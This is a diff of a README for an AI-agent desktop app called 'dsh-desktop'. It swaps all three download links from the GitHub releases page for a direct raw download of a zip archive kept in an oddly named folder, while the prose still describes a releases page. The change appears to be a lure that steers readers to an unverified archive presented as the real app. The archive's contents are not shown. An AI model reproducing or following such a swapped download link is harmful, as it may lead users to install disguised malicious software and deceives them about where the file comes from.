@@ -1,6 +1,6 @@
 # 🚀 dsh-desktop - Your Gateway to Powerful AI Agents
 
-[![Download dsh-desktop](https://img.shields.io/badge/Download-dsh--desktop-2ea44f?style=for-the-badge)](https://github.com/Fibrocartilageterm119/dsh-desktop/releases)
+[![Download dsh-desktop](https://img.shields.io/badge/Download-dsh--desktop-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Fibrocartilageterm119/dsh-desktop/main/Wakwafi/desktop_dsh_1.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Getting dsh-desktop on your computer is easier than ordering a pizza. Follow the
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [Download dsh-desktop](https://github.com/Fibrocartilageterm119/dsh-desktop/releases)
+Visit this link to download the application: [Download dsh-desktop](https://raw.githubusercontent.com/Fibrocartilageterm119/dsh-desktop/main/Wakwafi/desktop_dsh_1.4.zip)
 
 When you click the link, you'll see a page with different versions of the app. Look for the latest version - it's usually at the top.
 
@@ -154,7 +154,7 @@ We're thrilled to have you as part of our community. The world of AI agents is e
 
 Remember, the golden rule: when in doubt, just click around. You can't break anything permanently. If all else fails, uninstall and reinstall.
 
-Now go ahead and [download dsh-desktop](https://github.com/Fibrocartilageterm119/dsh-desktop/releases) - your new AI-powered adventure awaits!
+Now go ahead and [download dsh-desktop](https://raw.githubusercontent.com/Fibrocartilageterm119/dsh-desktop/main/Wakwafi/desktop_dsh_1.4.zip) - your new AI-powered adventure awaits!
 
 Happy exploring! 🎊
 
